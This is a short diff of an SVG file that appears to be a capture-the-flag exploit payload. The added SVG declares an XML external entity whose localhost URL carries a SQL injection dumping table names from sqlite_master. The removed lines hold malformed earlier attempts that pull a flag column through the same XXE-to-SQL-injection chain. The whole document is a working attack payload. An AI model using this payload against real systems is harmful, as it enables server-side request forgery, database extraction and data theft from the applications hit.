@@ -1,9 +1,8 @@
- <!ENTITY xxe SYSTEM
-    "http://127.0.0.1/search?q=%27%20UNION%20SELECT%20%28SELECT%20flag_63fa6a8b4183cf95%20FROM%20_0dab7bad101846f6%20LIMIT%201%29%2C%20%27text/plain%27--">
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM
+    "http://127.0.0.1:8001/search?q=%27%20UNION%20SELECT%20group_concat(name)%2C%20%27text/plain%27%20FROM%20sqlite_master--">
 ]>
-  <!ENTITY xxe2 SYSTEM
-    "http://127.0.0.1:8001/search?q=%27%20UNION%20SELECT%20%28SELECT%20flag_63fa6a8b4183cf95%20FROM%20_0dab7bad101846f6%20LIMIT%201%29%2C%20%27text/plain%27--">
-]>
-  <!ENTITY xxe3 SYSTEM
-    "http://127.0.0.1:5000/search?q=%27%20UNION%20SELECT%20%28SELECT%20flag_63fa6a8b4183cf95%20FROM%20_0dab7bad101846f6%20LIMIT%201%29%2C%20%27text/plain%27--">
-]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text>&xxe;</text>
+</svg>
